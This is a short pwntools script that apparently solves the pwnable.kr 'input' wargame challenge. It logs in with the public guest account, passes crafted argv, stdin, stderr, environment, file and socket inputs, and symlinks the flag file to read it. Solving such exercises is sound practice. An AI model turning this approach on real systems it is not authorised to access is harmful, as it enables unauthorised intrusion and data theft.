from pwn import *

s = ssh("input2", "pwnable.kr", port=2222, password="guest")

args = ['A' for _ in range(100)]
args[0] = "/home/input2/input"
args[65] = "\x00"                   # Stage 1
args[66] = "\x20\x0a\x0d"           # Stage 1
args[67] = "54321"                  # Stage 5

s.process(['mkdir', "/tmp/gdsg"])                               # create custom directory for cwd in process function

s.upload_data(b'\x00\x00\x00\x00', '/tmp/gdsg/\x0a')            # write to "\x0a" file for Stage 4

s.process(["ln", "-sf", "/home/input2/flag", "/tmp/gdsg/flag"]) # create link for the actual flag file in our directory

p = s.process(
    cwd="/tmp/gdsg",                                            # change to directory we made
    argv=args, 
    env={'\xde\xad\xbe\xef':'\xca\xfe\xba\xbe'},                # set env for Stage 3
    stdin="/tmp/gdsg/stdin",                                    # can do stdin=r0 if not doing this remotely
    stderr="/tmp/gdsg/stderr")                                  # can do stderr=r2 if not doing this remotely

s.upload_data(b'\x00\x0a\x00\xff', '/tmp/gdsg/stdin')           # Stage 2
s.upload_data(b'\x00\x0a\x02\xff', '/tmp/gdsg/stderr')          # Stage 2

# can also be done by doing this and pass r0 and r2 as stdin and stderr to process(...) if not doing it remotely

# r0, w0 = os.pipe()
# os.write(w0, "\x00\x0a\x00\xff")
# r2, w2 = os.pipe()
# os.write(w2, "\x00\x0a\x00\xff")

# might also be able to do this when not remote but I havent tested (seen in a writeup)

# p.stdin.write(b"\x00\x0a\x00\xff")
# p.stdin.flush()
# p.stderr.write(b"\x00\x0a\x02\xff") # No need to flush, stderr is unbuffered

conn = s.remote('localhost', 54321)      # Stage 5
conn.sendline(b'\xde\xad\xbe\xef')

print(p.recvall().decode())